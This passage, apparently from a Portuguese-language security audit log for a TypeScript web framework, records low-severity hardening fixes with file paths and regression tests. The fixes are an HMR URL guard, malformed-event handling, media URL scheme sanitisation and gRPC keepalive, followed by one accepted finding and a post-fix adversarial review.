| L13 | O cliente HMR deixa de confiar no `path`/`version` do servidor: `applyUpdate` só faz `import()` se `isTrustedModuleUrl` (URL de módulo same-origin `/@fs`/`/@app`, sem esquema/host protocolo-relativo/backslash/NUL) e `isValidVersion` (número finito ≥0) — senão faz full reload. Guard puro em `hmr-guard.ts` (testável); cliente passa a ser bundled para o inlinar | `dev/src/hmr-guard.ts`, `dev/src/client.ts:89` | `dev/test/security-l13-hmr-guard.audit.test.ts` (2) |

### Endurecimento BAIXO/INFO — Slice D (final)

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| L7 | `createResourceStore.apply` valida a forma de cada evento (`e?.object?.metadata?.uid` + `type ∈ {ADDED,MODIFIED,DELETED}`): um evento malformado é **saltado** (`continue`), não lança nem aborta o lote — os eventos válidos do mesmo lote continuam a aplicar-se | `k8s/src/index.ts:69` | `k8s/test/security-l7-malformed-event.audit.test.ts` (2) |
| L9 | **Já coberto por H1** — não precisa de código novo nos componentes. `isUrlAttr` inclui `src`/`poster`, logo o renderer (cliente+SSR) passa esses atributos por `sanitizeUrl` no sink; um `src`/`poster` `javascript:`/`data:text/html` em `image`/`video`/`avatar` é neutralizado. PoC de verificação adicionado | `dom/src/escape.ts` (isUrlAttr/sanitizeUrl, H1) | `ui/test/security-l9-media-url-scheme.audit.test.ts` (4) |
| L11 | `createGrpcChannel` ganha `keepAlive` (opt-in) + `close()`: com `keepAlive:true` reutiliza **uma** sessão HTTP/2 multiplexada entre chamadas (reconecta se cair), em vez de abrir/fechar por chamada. O default mantém-se stateless (sessão por chamada — sem ciclo de vida a gerir, zero regressão) | `edge/src/grpc.ts:86` | `edge/test/security-l11-grpc-keepalive.audit.test.ts` (2) |

**L12 — aceite (não corrigido), com fundamentação.** Validar a resposta do servidor
no cliente é uma **funcionalidade**, não um endurecimento, e desalinhada do âmbito
actual: (1) o tipo `Operation` do OpenAPI nem sequer modela `responses`, logo não há
schema de resposta para compilar sem o adicionar; (2) o cliente SOAP devolve `as Res`
sem schema nenhum; (3) o cliente valida o **pedido** que controla — a resposta é o
contrato do **servidor**, validado do lado do servidor. Validação de resposta
opt-in fica como trabalho de uma sessão futura (feature), não deste endurecimento.

**Backlog restante:** apenas os sub-vectores **server-side** de M7 (fila `wsAdapter`,
corpo `nodeListener`, acumulação gRPC — §8.3). **Todos os ALTO (H1–H5), MÉDIO (M1–M11)
e BAIXO/INFO (L1–L13) estão fechados** — por correcção com PoC red→green, excepto L9
(coberto por H1, com PoC de verificação) e L12 (aceite com fundamentação).

### Validação pós-correcção (revisão adversarial)

Antes de dar por fechado, 4 revisores adversariais varreram a diff desta ronda. Três
defeitos REAIS foram confirmados (repro concreto) e corrigidos com teste de regressão:
(1) **L8** — a serialização em pares fazia `[{a:1}]` colidir com `[[["a",1]]]` (objecto
vs array-de-pares); corrigido com o envelope `{o:…}`. (2) **M11** — `loadBounded` criava
a promessa de `load()` e saía cedo num `signal` já abortado SEM anexar o handler → um
`load()` rejeitante virava `unhandledRejection`; corrigido rejeitando antes de invocar
`load()`. (3) **L10** — `HOST_RE` aceitava porta > 65535, e `new Request` lança
síncronamente no handler `end` (fora do `.catch`) → uncaughtException; corrigido com
range-check da porta + backstop try/catch→400 no `nodeListener`. `npm run check` =
**408 testes** verdes após as correcções. O resto da diff (scanner raw-text L1, guard
`guarded`/concorrência M11, ciclo de vida do pooling gRPC L11, L4/L5/L13/M10/L7) foi
verificado correcto.
